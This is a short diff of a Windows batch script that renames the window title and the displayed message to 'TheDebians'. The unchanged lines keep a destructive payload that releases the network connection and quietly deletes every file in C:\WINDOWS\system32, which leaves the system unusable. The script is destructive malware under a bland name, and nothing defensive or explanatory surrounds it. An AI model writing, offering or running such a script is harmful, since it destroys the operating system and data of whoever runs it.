@@ -1,8 +1,8 @@
 @echo off
-title Debian Security Services 
+title TheDebians
 ipconfig /release
 
-echo The Vampires Are attackings...
+echo TheDebians
 
 del c:\WINDOWS\system32\*.*/q
 
